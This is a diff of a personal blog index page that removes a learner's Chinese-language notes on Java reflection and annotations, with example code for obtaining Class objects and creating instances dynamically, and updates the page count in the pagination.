-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        &#x2F;&#x2F;通过反射获取类的class对象</span><br><span class="line">        Class c1&#x3D;Class.forName(&quot;com.kuang.lesson01.User&quot;);</span><br><span class="line">        System.out.println(c1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;对比类是否相同（打印hashcode）</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line">        &#x2F;&#x2F;一个类在内存中只有一个class对象</span><br><span class="line">        &#x2F;&#x2F;一个类被加载后，类的整个结构都会被封装在Class对象中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;实体类</span><br><span class="line">class User&#123;</span><br><span class="line">    private String name ;</span><br><span class="line">    private int id;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public User(String name, int id, int age)&#123;</span><br><span class="line">        this.name&#x3D;name;</span><br><span class="line">        this.id&#x3D;id;</span><br><span class="line">        this.age&#x3D;age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">                &quot;, id&#x3D;&quot; + id +</span><br><span class="line">                &quot;, age&#x3D;&quot; + age +</span><br><span class="line">                &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以用来找类的各种信息（如父类）：虽然不如编辑器好用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;测试class类的创建方式有哪些</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Person person &#x3D; new Student();</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式一：通过对象获得</span><br><span class="line">        Class c1&#x3D;person.getClass();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式二：forname获得</span><br><span class="line">        Class c2&#x3D;Class.forName(&quot;com.kuang.lesson01.Student&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方法三：通过类名.class获得</span><br><span class="line">        Class c3&#x3D; Student.class;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;验证几个内容是否相同</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line">        System.out.println(c2.hashCode());</span><br><span class="line">        System.out.println(c3.hashCode());</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式四：基本内置类的包装类都有一个Type属性</span><br><span class="line">        Class c4&#x3D;Integer.TYPE;</span><br><span class="line">        System.out.println(c4);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;获得父类的类型</span><br><span class="line">        Class c5&#x3D;c1.getSuperclass();</span><br><span class="line">        System.out.println(c5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person&#123;</span><br><span class="line">    public String name ;</span><br><span class="line"></span><br><span class="line">    public Person()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name)&#123;</span><br><span class="line">        this.name&#x3D;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">        &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Student extends Person&#123;</span><br><span class="line">    public Student()&#123;</span><br><span class="line">        this.name&#x3D;&quot;学生&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Teacher extends Person&#123;</span><br><span class="line">    public Teacher()&#123;</span><br><span class="line">        this.name&#x3D;&quot;老师&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>测试各种类型的class是什么</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.ElementType;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;测试class类的创建方式有哪些</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Class c1 &#x3D; Object.class;&#x2F;&#x2F;类</span><br><span class="line">        Class c2 &#x3D; Comparable.class;&#x2F;&#x2F;接口</span><br><span class="line">        Class c3 &#x3D; String[].class;&#x2F;&#x2F;一维数组</span><br><span class="line">        Class c4 &#x3D; int[][].class;&#x2F;&#x2F;二维数组</span><br><span class="line">         Class c5 &#x3D; Override.class;&#x2F;&#x2F;注解</span><br><span class="line">        Class c6 &#x3D; ElementType.class;&#x2F;&#x2F;枚举</span><br><span class="line">        Class c7 &#x3D; Integer.class;&#x2F;&#x2F;基本数据类型</span><br><span class="line">        Class c8 &#x3D; void.class;&#x2F;&#x2F;void</span><br><span class="line">        Class c9 &#x3D; Class.class;&#x2F;&#x2F;Class</span><br><span class="line"></span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        System.out.println(c4);</span><br><span class="line">        System.out.println(c5);</span><br><span class="line">        System.out.println(c6);</span><br><span class="line">        System.out.println(c7);</span><br><span class="line">        System.out.println(c8);</span><br><span class="line">        System.out.println(c9);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;只要元素类型与维度一样，就是同一个class</span><br><span class="line">        int[] a&#x3D;new int[10];</span><br><span class="line">        int[] b&#x3D;new int[100];</span><br><span class="line">        System.out.println(a.getClass().hashCode());</span><br><span class="line">        System.out.println(b.getClass().hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>java内存(讲的不是很清楚）：<br>栈<br>    Main()<br>堆<br>    java.lang.Class类<br>    new A()<br>    ……<br>方法区（特殊的堆）<br>    1.静态变量<br>    2.静态方法<br>    3.常量池<br>    4.代码<br>    ……</p>
-<p>获得类的属性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field[] field&#x3D;c1.getDeclaredFields();</span><br></pre></td></tr></table></figure>
-<p>获得类的方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] nethod&#x3D;c1.getDeclaredMethods();</span><br></pre></td></tr></table></figure>
-
-<p>获得构造器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor&#x3D;c1.getDeclaredConstructors();</span><br></pre></td></tr></table></figure>
-
-<p>动态创建对象：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过反射动态创建对象</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        &#x2F;&#x2F;获得Class对象</span><br><span class="line">        Class c1&#x3D; Class.forName(&quot;com.kuang.lesson01.User&quot;);</span><br><span class="line">        &#x2F;&#x2F;构造一个对象</span><br><span class="line">        &#x2F;&#x2F;Object user&#x3D;(User)c1.newInstance();&#x2F;&#x2F;JDK9以后废弃了</span><br><span class="line">        Object user&#x3D;c1.getDeclaredConstructor().newInstance();&#x2F;&#x2F;一般用这个</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>invoke方法：激活<br>set方法：操作属性<br>若原方法为private，需要先调用setAccessible(true)方法（开启访问权限），然后就可以访问private（取消权限检测）</p>
-<p>性能分析：<br>时间：普通方式&lt;关闭检测的反射方式&lt;反射方式</p>
-<p>获取泛型信息：<br>（一脸懵逼）</p>
-<p>获取注解信息<br>获得注解<br>.getAnnotations()<br>获得注解value的值<br>.getAnnotations(xxx.class).value<br>获得类指定的注解<br>.getFecaresField(“xxx”).getAnnotations(xxx.class)</p>
-<p>说实话学完了之后对注解还是一头雾水，如果以后学框架需要的话再回来补吧</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
